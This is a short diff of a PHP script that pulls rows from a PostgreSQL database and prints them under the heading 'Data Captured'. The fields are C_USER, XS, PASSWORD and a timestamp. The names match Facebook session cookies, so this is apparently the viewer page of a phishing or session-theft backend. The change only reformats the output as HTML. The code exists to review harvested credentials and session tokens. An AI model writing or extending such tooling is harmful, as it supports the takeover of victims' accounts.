@@ -12,12 +12,13 @@ EOF;
     exit;
   } 
   while($row = pg_fetch_row($ret)) {
-    echo "*********Data Captured**********\n";
-    echo "C_USER = ". $row[1] . "\n";
-    echo "XS = ". $row[2] ."\n";
-    echo "PASSWORD = ". $row[3] ."\n";
-    echo "TIME =  ".$row[4] ."\n";
-    echo "------------------------------\n";
+    echo "<p>*********Data Captured**********</p>\n";
+    echo "<p>C_USER = ". $row[1] . "</p>\n";
+    echo "<p>XS = ". $row[2] ."</p>\n";
+    echo "<p>PASSWORD = ". $row[3] ."</p>\n";
+    echo "<p>TIME =  ".$row[4] ."</p>\n";
+    echo "<p>------------------------------</p>\n";
+    echo "<br /> <br />";
     echo "\n\n";
   }
   pg_close($dbconn);
